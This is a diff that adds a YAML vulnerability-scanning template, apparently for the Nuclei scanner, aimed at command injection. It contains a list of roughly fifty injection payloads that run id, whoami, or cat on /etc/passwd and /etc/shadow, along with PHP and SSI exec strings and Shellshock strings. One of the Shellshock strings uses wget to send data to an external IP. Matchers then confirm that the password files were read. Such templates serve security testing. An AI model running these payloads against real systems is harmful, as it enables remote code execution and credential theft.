@@ -1,0 +1,95 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "%3B%2Fusr%2Fbin%2Fid"
+        - "%26%20id"
+        - "%3Cid%7C"
+        - "<?php system(\"cat /etc/passwd\");?>"
+        - "%3Bcat%24u%2B%2Fetc%24u%2Fpasswd%24u"
+        - "<id"
+        - "cat%20%2Fetc%24u%2Fpasswd"
+        - "%3Bcat%2B%2Fetc%2Fpasswd"
+        - "%60id%60"
+        - "() { :;}; /bin/bash -c \"sleep 3 && echo vulnerable 3\""
+        - "%29%0Awhoami"
+        - "%7Ccat%24u%2B%2Fetc%24u%2Fpasswd%24u"
+        - "| id"
+        - "%22cat%22%20%2Fetc%24u%2Fpasswd%24u"
+        - "%3B%7Cid"
+        - "<!--#exec cmd=\"/usr/bin/id\"-->"
+        - "\\nid"
+        - "%3Bphpinfo"
+        - "%26cat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "a%0Aid%0A"
+        - "%27%0Awhoami%0A%27"
+        - "cat${IFS}/etc/passwd"
+        - "||id"
+        - "%26%26cat%24IFS%2Fetc%2Fpasswd"
+        - "%26cat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "/*$(id)`id`"
+        - "<!--#exec cmd=\"/bin/cat /etc/shadow\"-->"
+        - "%0aid"
+        - "& id"
+        - "id"
+        - "\\nid"
+        - "%60cat%20%2Fetc%2Fpasswd%60"
+        - "%0Aid"
+        - "||cat /etc/passwd"
+        - "%7C%0Awhoami"
+        - "%0Aid"
+        - "&&echo${IFS}\"RCE\"${IFS}&&cat${IFS}/etc/passwd"
+        - "||cat"
+        - "a);id|"
+        - "cat%24u%20%2Fetc%24u%2Fpasswd"
+        - "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13?pwd=\\`pwd\\`\""
+        - "%27%0Aid%0A%27"
+        - "cat+/etc/passwd"
+        - "%26id"
+        - "%26%7Bcat%2C%2Fetc%2Fpasswd"
+        - "&&cat /etc/passwd"
+        - "id"
+        - "cat%20%2Fetc%24u%2Fpasswd"
+        - "%26%20id"
+        - "|id"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
